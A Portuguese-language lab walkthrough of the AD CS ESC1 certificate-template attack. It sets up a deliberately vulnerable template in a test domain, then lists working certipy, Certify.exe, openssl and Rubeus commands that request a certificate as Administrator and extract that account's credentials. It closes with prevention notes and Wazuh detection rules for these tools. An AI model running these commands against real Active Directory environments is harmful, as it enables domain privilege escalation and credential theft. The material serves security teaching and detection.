👉 [Explicação](#explicação)  
⚙️ [Configuração](#configuração)  
⚠️ [Ataque](#ataque)  
🛡️ [Prevenção](#prevenção)  
📊 [Detecção](#detecção)

## Explicação
A exploração do certificado AD CS ESC1 é uma vulnerabilidade crítica nos Serviços de Certificados do Active Directory. Neste artigo, exploraremos como modelos de certificados mal configurados podem levar ao aumento de privilégios. Além disso, abordaremos várias técnicas de exploração.

O modelo de certificado AD CS (Serviços de Certificados do Active Directory) é uma configuração predefinida no Microsoft AD CS que define o tipo de certificado que um usuário, computador ou serviço pode solicitar. Ele especifica parâmetros como a finalidade pretendida do certificado, algoritmos de criptografia, período de validade e se ele pode ser registrado automaticamente.

Esses modelos permitem que os administradores controlem a emissão e o gerenciamento de certificados no ambiente do Active Directory de uma organização. O AD CS usa esses modelos para padronizar a emissão de certificados, facilitando a implantação de certificados seguros para usuários, computadores e serviços.

## Configuração
Vamos criar um novo modelo chamado “ESC1-Vulnerable” para não modificar os que já existem. Faremos isso no seu controlador de domínio, HYDRA-DC.
- Abra o console de modelos de certificados:
  . No HYDRA-DC, abra o Gerenciador do Servidor.
  . Vá para o menu Ferramentas e selecione Autoridade de Certificação.
  . No painel esquerdo, expanda sua CA (por exemplo, MARVEL-HYDRA-DC-CA).
  . Clique com o botão direito do mouse em Certificate Templates e selecione Manage.

- Duplique um modelo existente:
  . Na lista, procure o modelo “User” (é o mais comum).
  . Clique com o botão direito do mouse em User e selecione Duplicate Template.

-  Configurar o novo modelo (“ESC1-Vulnerável”):
  . Na guia Geral, dê a ele um nome que o identifique facilmente, por exemplo: ESC1-Vulnerável.
  . Na guia Tratamento de Solicitações, certifique-se de que a opção Permitir exportação da chave privada esteja marcada. Isso nos permitirá exportar o certificado com sua chave privada.
  . Na guia Cryptography, deixe a configuração padrão (pelo menos “Microsoft RSA SChannel Cryptographic Provider” com um tamanho mínimo de chave de 2048).
  . Vá para a guia Extensions. Aqui, vamos verificar se as Application Policies (que são o mesmo que EKUs) incluem “Client Authentication”. Deve ser

Listo!!

## Ataque

### Linux
<img width="1061" height="510" alt="fsdfd" src="https://github.com/user-attachments/assets/64970528-f905-45f9-88d0-a7a29170de4c" />
<img width="731" height="776" alt="vv" src="https://github.com/user-attachments/assets/53ffa36f-7f90-4c59-8afe-c45d600a6cdd" />

✅ Por que é vulnerável?
Client Authentication	✅ TRUE	Pode autenticar como qualquer usuário
Enrollee Supplies Subject	✅ TRUE	Podemos especificar o sujeito (ex: Administrator)
Requires Manager Approval	✅ FALSE	Sem aprovação manual
Authorized Signatures Required	✅ 0	Sem necessidade de assinaturas
Domain Users pode se inscrever	✅ TRUE	fcastle (como Domain User) pode solicitar

- Pegamos o SID do DC 
<img width="1673" height="92" alt="sid" src="https://github.com/user-attachments/assets/e1389477-2a70-419d-b7e1-e41409d285ef" />

- Para solicitar um certificado para o Administrator, usamos:
  ```certipy req -u 'fcastle@MARVEL.local' -p 'MYpassword#' -ca 'MARVEL-HYDRA-DC-CA' -template 'ESC1-Vulnerable' -upn 'Administrator@MARVEL.local' -sid 'S-1-5-21-2699579203-2312383683-555258765-500' -target HYDRA-DC.MARVEL.local```
<img width="1785" height="305" alt="getcer" src="https://github.com/user-attachments/assets/57324199-f03f-4ee3-a1e0-54d89095d152" />

- Extraindo hash do Admin DC e entrando via evil-winrm
  <img width="1491" height="857" alt="hashandin" src="https://github.com/user-attachments/assets/329c2fbd-b523-476c-ad00-5b54e1b02797" />

### Windows
- ``` .\Certify.exe find /vulnerable``` para recon
- ```.\Certify.exe request /ca:MARVEL.local\\MARVEL-HYDRA-DC-CA /template:ESC1-User-Vuln /altname:Administrator```
- ``` openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx``` (convertir .pem a .pfx)
- ``` .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap```


## 🛡️ Prevenção

- Corrigir o Template Vulnerável
- Configurar GPO para restringir solicitações de certificado
```gpupdate /force```

## 🔍 Detecção
1. Detectar Solicitações de Certificado Suspeitas (EventID 4886/4887)
```
<group name="windows,adcs,attack,">
  <!-- EventID 4886: Certificate Services received a certificate request -->
  <rule id="100010" level="8">
    <if_sid>60006</if_sid>
    <field name="win.system.eventID">4886</field>
    <field name="win.eventdata.RequestAttributes" type="pcre2">(?i)Administrator|Domain Admins|Enterprise Admins</field>
    <description>ADCS: Solicitação de certificado para conta privilegiada: $(win.eventdata.Subject)</description>
    <group>adcs_attack,</group>
  </rule>

  <!-- EventID 4887: Certificate Services issued a certificate -->
  <rule id="100011" level="12">
    <if_sid>60006</if_sid>
    <field name="win.system.eventID">4887</field>
    <field name="win.eventdata.Subject" type="pcre2">(?i)Administrator|Domain Admins|Enterprise Admins</field>
    <field name="win.eventdata.RequestAttributes" type="pcre2">(?i)ESC1-Vulnerable</field>
    <description>CRÍTICO: Certificado para conta privilegiada emitido com template vulnerável</description>
    <group>adcs_attack,critical,</group>
  </rule>
</group>
```
4. Detectar Criação de Certificados com Template Vulnerável via Sysmon
```
<rule id="100015" level="8">
  <if_sid>61603</if_sid> <!-- Sysmon Process Creation -->
  <field name="win.eventdata.Image" type="pcre2">(?i)certify|certipy|openssl|certreq</field>
  <field name="win.eventdata.CommandLine" type="pcre2">(?i)ESC1-Vulnerable|altname|upn|Administrator</field>
  <description>Ferramenta de ataque ADCS detectada: $(win.eventdata.Image)</description>
  <group>adcs_attack,tool,</group>
</rule>
```













